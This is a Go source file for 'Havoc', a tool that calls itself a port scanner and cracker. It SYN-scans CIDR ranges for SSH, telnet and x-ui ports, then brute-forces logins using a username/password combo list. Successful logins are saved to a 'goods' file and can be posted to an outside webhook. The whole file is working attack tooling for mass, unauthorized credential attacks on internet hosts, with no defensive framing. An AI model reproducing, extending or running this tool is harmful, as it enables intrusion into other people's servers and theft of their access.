package main

import (
	"Havoc/cracker"
	"Havoc/scanner"
	"Havoc/utils"
	"bufio"
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/netip"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"sync"
	"syscall"
	"time"
)

var (
	Cidr        string
	OutputFile  string
	InputFile   string
	CrackMethod string
	ComboFile   string
	Timeout     time.Duration
	Scanner     bool
	Cracker     bool
	Verbose     bool
	UseWebhook  bool
	Port        int
	WebhookURL  string
)

func init() {
	flag.StringVar(&Cidr, "cidr", "", "The CIDR to scan (e.g. 237.84.2.178/24)")
	flag.StringVar(&OutputFile, "out", "goods.txt", "The output file (e.g. goods.txt)")
	flag.StringVar(&InputFile, "in", "", "The input file (e.g. input.txt)")
	flag.StringVar(&ComboFile, "combo", "combo.txt", "The combo file (e.g. combo.txt)")
	flag.StringVar(&CrackMethod, "method", "ssh", "The crack method (e.g. ssh)")
	flag.BoolVar(&Verbose, "v", false, "Enable verbose mode (e.g. -v)")
	flag.BoolVar(&Scanner, "scan", false, "Enable scanner mode (e.g. -scan)")
	flag.BoolVar(&Cracker, "crack", false, "Enable cracker mode (e.g. -crack)")
	flag.BoolVar(&UseWebhook, "webhook", false, "Use webhook to send results (e.g. -webhook)")
	flag.DurationVar(&Timeout, "timeout", 5*time.Second, "The timeout (e.g. 5s)")
	flag.IntVar(&Port, "port", -1, "The port to scan (e.g. 22)")

	showMethods := flag.Bool("methods", false, "Print available methods")

	flag.Usage = func() {
		fmt.Println("Havoc - A simple port scanner and cracker")
		fmt.Println("By @XenonCommunity")
		flag.PrintDefaults()
		os.Exit(0)
	}

	flag.Parse()

	if !flag.Parsed() {
		flag.PrintDefaults()
		return
	}

	if *showMethods {
		fmt.Println("Available methods: ssh, xui, telnet")
		os.Exit(-1)
		return
	}

	if Port == -1 {
		switch CrackMethod {
		case "ssh":
			Port = 22
		case "xui":
			Port = 54321
		case "telnet":
			Port = 23
		default:
			fmt.Println("Please specify a port")
			os.Exit(-1)

		}
	}

	if Scanner && (Cidr == "" || Port == -1) {
		fmt.Println("Please specify a CIDR and a port")
		os.Exit(-1)
		return
	}

	if Cracker && ComboFile == "" {
		fmt.Println("Please specify a combo file")
		os.Exit(-1)
		return
	} else {
		if _, err := os.Stat(ComboFile); os.IsNotExist(err) {
			fmt.Println("Combo file does not exist")
			os.Exit(-1)
			return
		}
	}

	if UseWebhook {
		if _, err := os.Stat(".webhook"); !os.IsNotExist(err) {
			file, err := os.ReadFile(".webhook")
			if err != nil {
				fmt.Println("Failed to read webhook URL")
				os.Exit(-1)
				return
			}
			WebhookURL = strings.TrimSpace(string(file))
		} else if os.Getenv("WEBHOOK_URL") == "" {
			fmt.Println("WEBHOOK_URL is not set")
			os.Exit(-1)
			return
		} else {
			WebhookURL = os.Getenv("WEBHOOK_URL")
		}

		resp, err := http.Get(WebhookURL)
		if err != nil {
			fmt.Println("Failed to validate webhook URL")
			fmt.Println(err)
			os.Exit(-1)
			return
		}

		if resp.StatusCode != 200 {
			fmt.Println("Failed to validate webhook URL")
			fmt.Println(err)
			os.Exit(-1)
			return
		}

		defer resp.Body.Close()

		all, err := io.ReadAll(resp.Body)

		if err != nil {
			fmt.Println("Failed to read webhook URL")
			fmt.Println(err)
			os.Exit(-1)
			return
		}

		if !bytes.ContainsAny(all, WebhookURL) {
			fmt.Println("Failed to validate webhook URL")
			os.Exit(-1)
			return
		}

		fmt.Println("Using webhook URL:", WebhookURL)
	}
}

func main() {
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt, syscall.SIGTERM, os.Kill)

	go func() {
		<-signalChan
		os.Exit(0)
	}()

	addrPorts := make(chan netip.AddrPort, 4096)

	if Scanner {
		go startScanner(addrPorts)
	} else if Cracker {
		go startReader(addrPorts)
	} else {
		panic("Please specify either -scan or -crack")
	}

	if Cracker {
		var c cracker.Cracker
		var combos, cps = getCombinations(), utils.NewCPSCounter()

		switch strings.ToLower(CrackMethod) {
		case "ssh":
			c = cracker.NewSSHCracker(combos, cps, Timeout)
		case "telnet":
			c = cracker.NewTelnetCracker(combos, cps, Timeout)
		default:
			panic("Unknown crack method")
		}

		if err := c.Init(); err != nil {
			panic(err)
			return
		}

		go func() {
			cps.Reset()
			for {
				time.Sleep(time.Second)
				fmt.Printf("[+] CPS: %d           \r", cps.GetCPS())
			}
		}()

		look := new(sync.Mutex)
		for {
			addrPort := <-addrPorts

			go func(look *sync.Mutex) {
				data, err := c.Check(addrPort)

				if data == nil && err == nil {
					return
				}

				if err != nil {
					//log.Println(err)
					return
				}

				if Verbose {
					fmt.Println(data.String())
				}

				writeResult(look, data)

			}(look)
		}
		return
	}

	for {
		result := cracker.NewScanResult(
			"scan",
			<-addrPorts,
		)

		if Verbose {
			fmt.Println(result)
		}

		writeResult(new(sync.Mutex), result)
	}
}

func writeResult(look *sync.Mutex, check *cracker.GoodResult) {
	if check == nil {
		return
	}

	look.Lock()
	defer look.Unlock()

	if OutputFile != "" {
		file, err := os.OpenFile(OutputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

		if err != nil {
			panic(err)
		}

		defer file.Close()
		_, _ = file.WriteString(check.String() + "\n")

	} else {
		_, _ = os.Stdout.WriteString(check.String() + "\n")
	}

	if UseWebhook {
		writeWebhook(check)
	}
}

func writeWebhook(check *cracker.GoodResult) {
	fields := []map[string]interface{}{
		{
			"name":   "Addr",
			"value":  check.IP.String(),
			"inline": false,
		},
	}

	if check.Data != "" {
		fields = append(fields, map[string]interface{}{
			"name":   "Result",
			"value":  check.Data,
			"inline": false,
		})
	}

	data := map[string]interface{}{
		"embeds": []interface{}{
			map[string]interface{}{
				"title":     "New Good Result - " + strings.ToTitle(check.Type),
				"color":     check.Color(),
				"timestamp": check.Timestamp.Format(time.RFC3339),
				"fields":    fields,
			},
		},
	}

	marshal, err := json.Marshal(data)
	if err != nil {
		return
	}

	_, _ = http.Post(WebhookURL, "application/json", bytes.NewBuffer(marshal))
}

func getCombinations() cracker.CheckCombo {
	var combos cracker.CheckCombo

	file, err := os.OpenFile(ComboFile, os.O_RDONLY, 0644)
	if err != nil {
		panic(err)
	}

	defer file.Close()
	newScanner := bufio.NewScanner(file)

	for newScanner.Scan() {
		combo := cracker.ParseCombo(newScanner.Text())

		if combo == nil {
			continue
		}

		combos = append(combos, *combo)
	}

	return combos
}

func startReader(ports chan netip.AddrPort) {
	reader := os.Stdin

	if InputFile != "" {
		file, err := os.OpenFile(InputFile, os.O_RDONLY, 0644)
		if err != nil {
			panic(err)
		}
		defer file.Close()
		reader = file
	}

	newScanner := bufio.NewScanner(reader)
	ipPattern := regexp.MustCompile(`(?m)((?:\d{1,3}\.){3}\d{1,3})`)
	port := uint16(Port)

	for newScanner.Scan() {
		text := newScanner.Text()
		matches := ipPattern.FindAllString(text, -1)

		for _, match := range matches {
			if from4, ok := netip.AddrFromSlice(net.ParseIP(match).To4()); ok {
				ports <- netip.AddrPortFrom(from4, port)
			}
		}
	}
}
func startScanner(ports chan netip.AddrPort) {
	s := scanner.NewSynScanner()

	if err := s.Init(); err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("Starting scanner")

	var portsList []*net.IPNet

	for _, a := range strings.Split(Cidr, " ") {
		portsList = append(portsList, MustParseCIDR(a))
	}

	fmt.Printf("Scanning %d CIDR...\n", len(portsList))

	s.Scan(ports, uint16(Port), portsList...)

}

func MustParseCIDR(s string) *net.IPNet {
	_, cidr, err := net.ParseCIDR(s)
	if err != nil {
		panic(err)
	}
	return cidr
}
